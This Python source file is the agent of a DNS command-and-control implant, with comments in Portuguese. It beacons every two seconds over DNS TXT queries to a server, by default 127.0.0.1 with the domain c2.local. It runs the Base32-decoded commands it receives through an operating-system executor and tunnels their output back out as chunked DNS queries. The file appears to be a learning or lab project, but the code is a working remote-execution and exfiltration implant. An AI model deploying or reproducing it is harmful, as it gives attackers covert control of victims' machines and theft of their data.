import socket
import dns.message as dm
from common.protocolo import DNSprotocolo
from agente.executor import commandExecutor
from time import sleep

class DNSBeacon:
    def __init__(self, ip_servidor='127.0.0.1', porta=53, dominio='c2.local'):
        self.ip = ip_servidor
        self.porta = porta
        self.dominio = dominio

    def start(self):
        try:
            print('[*] Iniciando agente')

            while True:
                try:
                    self.fazerBeacon()

                except Exception as e:
                    print(f"[-] Erro no loop: {e}")

                sleep(2)

        except KeyboardInterrupt:
            print("\n[*] Desligando...")

        except Exception as e:
            print(f"[-] Erro inesperado: {e}")

        # BLOCO START: O coração do loop. Mantém o agente vivo rodando o beacon a cada 2 segundos.

    def fazerBeacon(self):
        try:
            url_msg = DNSprotocolo.encodar(b'1', b'comando', self.dominio)
            #print(f"[*] Enviando consulta para: {url_msg}")

            query = dm.make_query(url_msg, 'TXT')
            dados_binarios = query.to_wire()
        
            with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as s:
                s.sendto(dados_binarios, (self.ip, self.porta))
                #print("[+] Sinal enviado com sucesso!")

                dadosResposta, ip = s.recvfrom(1024)
                respostaDNS = dm.from_wire(dadosResposta)

                if respostaDNS.answer:
                    self.executaResposta(respostaDNS, s, ip)

        except Exception as e:
            print(f"[-] Erro no Beacon: {e}")

        # BLOCO FAZERBEACON: Envia o ping (Tipo 1) via DNS TXT, aguarda a resposta do servidor e engatilha a execução se houver ordens na seção Answer.

    def executaResposta(self, pacote, sock, ip):
        try:
            objetoRRset = pacote.answer[0]
            comandoBytes = DNSprotocolo.traduzir(objetoRRset[0].strings[0])
            comando = comandoBytes.decode('utf-8')

            executor = commandExecutor()
            outputComando = executor.executaComando(comando)

            self.enviaResposta(sock, ip, outputComando)

        except Exception as e:
            print(f"[-] Erro no executaResposta: {e}")

        # BLOCO EXECUTAFESPOSTA: Abre a resposta TXT, traduz o comando de Base32 para texto, chama o executor do sistema operacional e passa o resultado adiante.

    def enviaResposta(self, sock, ip, msg):
        try:
            urlLista = DNSprotocolo.fatiador(msg)
            aux = 0
            for i in urlLista:
                urlResposta = DNSprotocolo.encodar(b'2', i, self.dominio, numPacote=aux, totalPacotes=len(urlLista))

                queryResposta = dm.make_query(urlResposta, 'TXT')
                
                sock.sendto(queryResposta.to_wire(), ip)
                aux = aux+1
            print('recebido')
        except Exception as e:
            print(f"[-] Erro no enviaResposta: {e}")

        # BLOCO ENVIARESPOSTA: Pega a saída gerada pelo comando, fatia a string base32, envelopa com o Tipo 2 (Canal de Dados) usando o protocolo e joga os pacotes DNS final de volta na rede.

if __name__ == '__main__':
    agente = DNSBeacon()
    agente.start()